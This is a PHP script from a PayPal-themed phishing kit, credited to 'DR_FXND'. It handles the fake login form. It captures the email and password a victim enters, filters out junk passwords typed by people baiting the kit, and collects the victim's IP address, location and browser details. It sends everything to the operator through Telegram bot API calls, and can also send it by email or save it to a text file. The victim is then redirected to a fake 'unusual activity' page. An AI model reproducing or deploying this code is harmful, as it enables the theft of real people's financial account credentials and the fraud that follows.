<?php session_start();
if ($_SESSION['acsh33nz0key'] !== $_POST['acsh33nz0key']) {
    header('HTTP/1.0 404 Not Found');
} else {
    include '../mine.php';
    include '../bot.php';
    include '../cookies.php';
    include '../../../email.php';
    $pas = $_POST['PWD'];
    if (isset($_POST['EML']) && isset($_POST['PWD'])) {
        $check2 = "true";
        if (strpos($pas, 'fuck') !== false || strpos($pas, '1234') !== false || strpos($pas, '4321') !== false || strpos($pas, 'qwer') !== false || strpos($pas, 'rewq') !== false || strpos($pas, 'gotofindgoodjob') !== false || strpos($pas, 'stupid') !== false || strpos($pas, 'spammer') !== false || strpos($pas, 'fuckingspam') !== false || strpos($pas, 'spam') !== false || strpos($pas, 'sonofbitch') !== false || strpos($pas, '   ') !== false || strpos($pas, 'googlebot') !== false) {
            $check3 = "false";
        } else {
            $check3 = "true";
        }
    }
    if (isset($_POST['EML']) && isset($_POST['PWD'])) {
        if ($check2 == "true" && $check3 == "true") {
            $_SESSION['screen'] = $_POST['screen'];
            $_SESSION['EML'] = $_POST['EML'];
            $msg = "=========== <[ -" . $scamname . "- PPL LOGIN ]> ===========
";
            $msg.= "EMAIL		: {$_POST['EML']}
";
            $msg.= "PASS		: {$_POST['PWD']}
";
            $msg.= "---------------------- IP Info ----------------------
";
            $msg.= "IP ADDRESS	: {$_SESSION['ip']}
";
            $msg.= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
            $msg.= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}
";
            $msg.= "SCREEN		: {$_SESSION['screen']}
";
            $msg.= "USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}
";
            $msg.= "TIMEZONE	: {$_SESSION['ip_timezone']}
";
            $msg.= "TIME		: " . date("d/m/Y h:i:sa") . " GMT
";
            $msg.= "=========== <[ THANKS TO DR_FXND ]> ===========


";
            if ($saveintext == "yes") {
                $save = fopen("../../" . $filename . ".txt", "a+");
                fwrite($save, $msg);
                fclose($save);
            }
            file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");

            $subject = "-" . $scamname . "- PPL LOGIN [" . $_POST['EML'] . "] From [" . $_SESSION['ip_countryName'] . "]";
            $headers = "From: DR_FXND <>
";
            $headers.= "MIME-Version: 1.0
";
            $headers.= "Content-Type: text/plain; charset=UTF-8
";
            file_get_contents("https://api.telegram.org/bot" . $Api . "/sendMessage?chat_id=" . $Chatid . "&text=" . urlencode($msg) . "");
            if ($sendtoemail == "yes") {
                foreach (explode(",", $yours) as $your) {
                    @mail($your, $subject, $msg, $headers);
                }
            }
            if ($show_unusual_activity == "yes") {
                exit(header("Location: ../../app/unusual_activity"));
            } else {
                exit(header("Location: ../../app/process"));
            }
        } else {
            exit(header("Location: ../../app/signin?invalid"));
        }
    } else {
        header('HTTP/1.0 404 Not Found');
    }
};